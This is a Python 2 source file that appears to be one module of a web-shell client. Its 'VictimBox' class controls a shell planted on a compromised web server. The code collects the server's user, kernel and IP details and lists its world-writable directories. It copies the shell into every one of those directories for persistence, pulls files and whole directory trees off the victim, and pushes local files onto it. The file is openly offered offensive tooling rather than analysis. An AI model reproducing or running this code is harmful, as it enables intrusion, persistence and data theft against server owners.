from urllib2 import urlopen, URLError
from request_handler import make_request
from menu import Colors, getargs
from linux_version import linux
import os


class VictimBox(object):
    '''
    VictimBox class is used for getting information
    About the server like user, kernerl, cwd, IPs, etc
    It also has some methods to extend the usage of the
    Shell
    '''
    def __init__(self, url=None):
        self.url = url
        # call get_page_source() method then assign it to self.source
        self.source = source = map(str.strip, make_request.get_page_source().readlines())
        self.current_user = source[0]
        self.current_id = source[1]
        self.kernel_info = source[2]
        self.cwd = source[3]
        self.uptime = source[4]
        self.host_ip = ', '.join(source[5:])
        try:
            # get the attacker's ip address thx to g0tmi1k and hostess
            self.local_ip = (urlopen('http://ifconfig.me/ip').read()).strip()
        except URLError:
            self.local_ip = 'Unknown'

        # adding another command requires editing two modules
        # 1st- define the method here "victim_info.py" module
        # then add a logic statment in "executer.py" module
        self.available_commands = "['banner', 'clear', 'download', 'exit', 'history', 'info', 'spread', 'upload', 'writable']"

    def get_information(self):
        self.info = \
        '''
        {dashed}
        {red}User{end}        :  {green}{current_user}{end}
        {red}ID{end}          :  {green}{current_id}{end}
        {red}Kernel{end}      :  {green}{kernel_info}{end}
        {red}CWD{end}         :  {green}{cwd}{end}
        {red}Uptime{end}      :  {green}{uptime}{end}
        {red}Host IPs{end}    :  {green}{host_ip}{end}
        {red}External IP{end} :  {green}{local_ip}{end}
        {dashed}

        {hot}[+] Available commands: {available_commands}{end}
        {hot}[+] Inserting{end} {red}!{end} {hot}at the begining of the command will execute the command locally (on your box){end}
        '''.format(dashed='-' * int(len(self.kernel_info) + 16),
                red=Colors.RED, green=Colors.GREEN, end=Colors.END, hot=Colors.HOT,
                current_user=self.current_user,
                current_id=self.current_id,
                kernel_info=self.kernel_info,
                cwd=self.cwd,
                uptime=self.uptime,
                host_ip=self.host_ip,
                local_ip=self.local_ip,
                available_commands=self.available_commands,)
        print self.info

    # a method to get all writable directories within CWD
    def get_writable(self):
        make_request.cmd = "find {0} -depth -perm -0002 -type d".format(linux.get_doc_root())
        self.writables = map(str.strip, make_request.get_page_source().readlines())
        c = 1
        for path in self.writables:
            print '{0:2d}- {1}'.format(c, path)
            c += 1

    # a method to spread the shell in all writable directories
    def spread_shell(self):
        provided_shell_name = raw_input('\n{0}[!] Current shell name{1}: '.format(Colors.RED, Colors.END))
        shell_name = getargs.url.split('/')[-1] if getargs.method == 'post' else provided_shell_name
        make_request.cmd = 'find {0} -depth -perm -0002 -type d | xargs -n 1 cp {1}'.format(linux.get_doc_root(), shell_name)
        print make_request.get_page_source().read()
        print '[+] Successfully spread {0} to some writable paths\n[+] Type writable to check dirs'.format(shell_name)

    # a method for downloading files from the box
    def download_file(self, rfile_path, lfile_path):
        make_request.cmd = 'if [ -e {0} ]; then if [ -f {0} ]; then echo "file"; else echo "dir"; fi; fi'.format(rfile_path)
        file_type = make_request.get_page_source().read().strip()
        if file_type == 'file':
            make_request.cmd = 'cat {}'.format(rfile_path)
            try:
                with open(lfile_path, 'w') as dest_file:
                    dest_file.write(make_request.get_page_source().read().rstrip() + '\n')
                print '\n[+] Successfully downloaded {0} to {1}'.format(rfile_path, lfile_path)
            except IOError, e:
                print '{0}\n[!] {1}{2}'.format(Colors.RED, e, Colors.END)
        elif file_type == 'dir':
            make_request.cmd = 'find {0} |while read f;do echo "$f";done'.format(rfile_path)
            files = map(str.strip, make_request.get_page_source().readlines())
            for file in files:
                make_request.cmd = 'if [ -e {0} ]; then if [ -f {0} ]; then echo "file"; else echo "dir"; fi; fi'.format(file)
                file_type = make_request.get_page_source().read().strip()
                if file_type == 'dir':
                    os.makedirs(os.path.join(lfile_path, file))
                elif file_type == 'file':
                    make_request.cmd = 'cat {}'.format(file)
                    try:
                        with open(os.path.join(lfile_path, file), 'w') as dest_file:
                            dest_file.write(make_request.get_page_source().read().rstrip() + '\n')
                    except IOError, e:
                        print '\n{0}[!] Error: {1}{2}'.format(Colors.RED, e, Colors.END)
                else:
                    print '{0}[!] Coudln\'t download the following file:{1} {2}'.format(Colors.RED, Colors.END, file)
            print '\n{0}[+] Files downloaded successfully to{1} {2}'.format(Colors.GREEN, Colors.END, lfile_path)
        else:
            print '\n{0}[!]The file/dir doesn\'t exist or I don\'t have permission{1}'.format(Colors.RED, Colors.END)

    # a method for uploading files to the box
    def upload_file(self, lfile_path, rfile_path):
        with open(lfile_path) as local_file:
            data_to_upload = local_file.readlines()
        for line in data_to_upload:
            make_request.cmd = 'echo {0} >> {1}'.format(line.strip(), rfile_path)
            make_request.get_page_source()
        print '\n[+] Successfully uploaded {0} to {1}'.format(lfile_path, rfile_path)

# taking an instance from VictimBox class
victim_box = VictimBox()
